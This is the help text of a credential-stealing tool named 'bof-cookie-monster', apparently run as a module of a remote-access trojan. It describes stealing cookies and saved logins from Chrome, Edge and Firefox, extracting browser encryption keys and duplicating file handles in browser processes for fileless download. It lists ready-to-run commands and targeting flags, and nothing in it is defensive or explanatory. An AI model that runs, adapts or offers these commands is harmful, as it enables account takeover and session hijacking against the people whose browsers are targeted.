ABOUT
    Steals browser cookies and logins for Chrome, Edge, and Firefox.
    Extracts WebKit master key and App Bound encryption key, duplicates
    handles to Cookies and Login Data files for fileless download. Supports
    SYSTEM mode key decryption without browser injection. Use decrypt.py
    offline to decrypt downloaded databases.
USAGE:
    bof-cookie-monster --- <mode> [options]

EXAMPLES:
    bof-cookie-monster --- --chrome
    bof-cookie-monster --- --edge
    bof-cookie-monster --- --firefox
    bof-cookie-monster --- --system "C:\Users\USER\AppData\Local\Google\Chrome\User Data\Local State" 1234
    bof-cookie-monster --- --chromeCookiePID 5678
    bof-cookie-monster --- --chromeLoginDataPID 5678
    bof-cookie-monster --- --edgeCookiePID 5678
    bof-cookie-monster --- --edgeLoginDataPID 5678
    bof-cookie-monster --- --chrome --key-only
    bof-cookie-monster --- --edge --cookie-only
    bof-cookie-monster --- --chrome --login-data-only
    bof-cookie-monster --- --chrome --copy-file "C:\Folder\Location"

MODES:
    --chrome                Scan chrome.exe processes and duplicate Cookies handle
    --edge                  Scan msedge.exe processes and duplicate Cookies handle
    --firefox               Parse profiles.ini and download key4.db and logins.json
    --system                Decrypt app bound key without browser injection (requires Local State path and user PID)
    --chromeCookiePID       Target specific Chrome PID with Cookies handle
    --chromeLoginDataPID    Target specific Chrome PID with Login Data handle
    --edgeCookiePID         Target specific Edge PID with Cookies handle
    --edgeLoginDataPID      Target specific Edge PID with Login Data handle

OPTIONS:
    --key-only              Only retrieve app bound encryption key
    --cookie-only           Only retrieve Cookies file
    --login-data-only       Only retrieve Login Data file
    --copy-file             Copy files to specified folder instead of fileless retrieval

NUKERAT FLAGS:
    -w <seconds>    Maximum wait time until timeout
    -bg             Fork and run without waiting for output

    Example:
    bof-cookie-monster -w 60 --- --chrome
